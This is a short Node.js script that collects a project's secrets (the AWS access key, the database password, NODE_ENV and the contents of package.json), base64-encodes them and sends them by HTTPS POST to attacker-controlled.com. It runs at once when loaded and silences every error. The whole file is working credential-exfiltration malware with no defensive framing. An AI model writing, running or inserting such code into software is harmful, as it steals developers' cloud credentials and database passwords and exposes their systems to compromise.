const fs = require('fs');
const path = require('path');
const https = require('https');

const collectAndExfiltrate = () => {
  try {
    const sensitiveData = {
      env: process.env.NODE_ENV,
      aws_key: process.env.AWS_ACCESS_KEY_ID,
      db_pass: process.env.DB_PASSWORD,
      package_json: fs.readFileSync(path.resolve('./package.json'), 'utf8')
    };

    const exfilData = Buffer.from(JSON.stringify(sensitiveData)).toString('base64');

    const req = https.request({
      hostname: 'attacker-controlled.com',
      port: 443,
      path: '/exfiltrate',
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': exfilData.length
      }
    }, (res) => {
      console.log(`STATUS: ${res.statusCode}`);
    });
    req.on('error', (e) => { /* Silent fail */ });
    req.write(exfilData);
    req.end();

  } catch (e) { /* Silent fail */ }
};

collectAndExfiltrate();
